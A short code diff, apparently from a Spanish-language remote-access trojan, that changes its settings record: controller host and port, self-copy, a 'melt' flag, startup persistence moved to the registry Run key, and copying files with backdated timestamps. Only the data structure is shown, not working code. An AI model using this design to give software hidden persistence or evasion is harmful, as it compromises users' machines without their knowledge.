@@ -16,10 +16,10 @@ uses
 type
   {* All data we want to read/write is stored in this record *}
   TSettings = record
-    sHost, sPort, sID, sFileNameToCopy, sCopyTo, sPoliciesRegKeyName: string[255];
+    sHost, sPort, sID, sFileNameToCopy, sCopyTo, sRunRegKeyName,sPluginName: string[255];
     //Cadena de 255 caracteres
     iPort, iTimeToNotify: integer;
-    bCopiarArchivo, bMelt, bArranquePolicies, bCopiarConFechaAnterior: boolean;
+    bCopiarArchivo, bMelt, bArranqueRun, bCopiarConFechaAnterior: boolean;
   end;
   PSettings = ^TSettings;
 
